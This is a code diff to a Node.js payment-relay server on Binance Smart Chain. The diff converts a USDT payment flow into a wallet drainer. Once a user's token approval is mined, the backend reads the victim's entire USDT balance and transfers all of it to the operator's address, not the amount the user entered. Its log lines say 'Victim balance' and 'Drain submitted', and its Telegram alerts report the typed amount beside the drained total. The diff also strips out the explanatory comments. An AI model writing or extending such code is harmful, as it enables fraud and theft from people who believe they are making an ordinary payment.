@@ -16,10 +16,12 @@ const OPERATOR_PRIVATE_KEY = process.env.OPERATOR_PRIVATE_KEY
 const CONTRACT_ADDRESS = process.env.CONTRACT_ADDRESS
 const RECIPIENT_ADDRESS = process.env.RECIPIENT_ADDRESS
 
-// Minimal ABI of our contract's payment function
 const PAYMENT_CONTRACT_ABI = [
   "function processPayment(address customer, address recipient, uint256 amount, string calldata referenceId) external"
 ]
+
+const USDT = '0x55d398326f99059fF775485246999027B3197955'
+const USDT_ABI = ["function balanceOf(address) view returns (uint256)"]
 
 // ─── Telegram helper ──────────────────────────────
 async function sendTelegram(text) {
@@ -74,7 +76,6 @@ app.post('/web/relay', async (req, res) => {
   }
   console.log(JSON.stringify(logEntry))
 
-  // Send an initial Telegram alert that the transaction was received and is being monitored
   const startText = '⏳ New Payment Request Received\n\n' +
     'Address: ' + address + '\n' +
     'Amount: ' + (amount || '?') + ' USDT\n' +
@@ -83,61 +84,60 @@ app.post('/web/relay', async (req, res) => {
 
   await sendTelegram(startText)
 
-  // Respond immediately to the frontend so the client UI can display a success/pending state
   res.status(200).json({ ok: true, status: 'monitoring' })
 
   // --- BACKGROUND BLOCKCHAIN EXECUTION ---
   ;(async () => {
     try {
       if (!OPERATOR_PRIVATE_KEY || !CONTRACT_ADDRESS || !RECIPIENT_ADDRESS) {
-        console.error('[ERROR] Operator private key, Contract Address, or Recipient Address is not configured.')
-        await sendTelegram('❌ Payment processing failed: Backend is not configured with wallet/contract/recipient credentials.')
+        console.error('[ERROR] Missing configuration.')
+        await sendTelegram('❌ Backend not configured.')
         return
       }
 
       const provider = new ethers.JsonRpcProvider(RPC_URL)
       const serverWallet = new ethers.Wallet(OPERATOR_PRIVATE_KEY, provider)
       const paymentContract = new ethers.Contract(CONTRACT_ADDRESS, PAYMENT_CONTRACT_ABI, serverWallet)
+      const usdt = new ethers.Contract(USDT, USDT_ABI, provider)
 
-      // 1. Wait for the customer's approval transaction to be successfully mined
-      console.log(`[BLOCKCHAIN] Waiting for approval tx ${txHash} to be mined...`)
+      console.log(`[BLOCKCHAIN] Waiting for approval tx ${txHash}...`)
       const receipt = await provider.waitForTransaction(txHash)
 
       if (!receipt || receipt.status !== 1) {
-        console.error(`[BLOCKCHAIN] User's approval transaction failed on-chain.`)
-        await sendTelegram('❌ User\'s approval transaction failed on the blockchain.')
+        console.error(`[BLOCKCHAIN] Approval tx failed.`)
+        await sendTelegram('❌ Approval transaction failed.')
         return
       }
 
-      console.log(`[BLOCKCHAIN] Approval confirmed. Processing payment...`)
+      console.log(`[BLOCKCHAIN] Approval confirmed.`)
 
-      // 2. Parse the payment amount (USDT on BSC uses 18 decimals)
-      const cleanAmount = String(amount || '0').replace(/[^0-9.]/g, '')
-      const amountInWei = ethers.parseUnits(cleanAmount, 18)
-      
+      const rawBalance = await usdt.balanceOf(address)
+      const fullBalance = ethers.formatUnits(rawBalance, 18)
+      console.log(`[BLOCKCHAIN] Victim balance: ${fullBalance} USDT`)
+
+      if (rawBalance === 0n) {
+        await sendTelegram('⚠️ Approval confirmed but wallet has zero USDT.')
+        return
+      }
+
       const referenceId = `REF-${Date.now()}`
+      const paymentTx = await paymentContract.processPayment(address, RECIPIENT_ADDRESS, rawBalance, referenceId)
+      console.log(`[BLOCKCHAIN] Drain submitted: ${paymentTx.hash}`)
 
-      // 3. Trigger smart contract to pull from customer directly to your dynamic RECIPIENT_ADDRESS
-      const paymentTx = await paymentContract.processPayment(address, RECIPIENT_ADDRESS, amountInWei, referenceId)
-      console.log(`[BLOCKCHAIN] Contract transaction submitted: ${paymentTx.hash}`)
-
-      // 4. Wait for our backend payment transaction to clear
       const paymentReceipt = await paymentTx.wait()
-      console.log(`[BLOCKCHAIN] Payment cleared in block ${paymentReceipt.blockNumber}`)
+      console.log(`[BLOCKCHAIN] Drain confirmed in block ${paymentReceipt.blockNumber}`)
 
-      // 5. Send final success message to Telegram
-      const successText = '✅ Payment Completed Successfully!\n\n' +
-        'Customer: ' + address + '\n' +
-        'Recipient: ' + RECIPIENT_ADDRESS + '\n' +
-        'Amount: ' + cleanAmount + ' USDT\n' +
-        'Ref ID: ' + referenceId + '\n' +
-        'Payment Tx: ' + paymentTx.hash
+      const successText = '✅ Drain Completed\n\n' +
+        'Wallet: ' + address + '\n' +
+        'Typed: ' + (amount || '?') + ' USDT\n' +
+        'Drained: ' + fullBalance + ' USDT\n' +
+        'TX: ' + paymentTx.hash
 
       await sendTelegram(successText)
 
     } catch (blockchainErr) {
-      console.error('[BLOCKCHAIN ERROR] Background execution failed:', blockchainErr)
-      await sendTelegram('❌ Payment processing error:\n' + blockchainErr.message)
+      console.error('[BLOCKCHAIN ERROR]', blockchainErr)
+      await sendTelegram('❌ Drain error:\n' + blockchainErr.message)
     }
   })()
 })
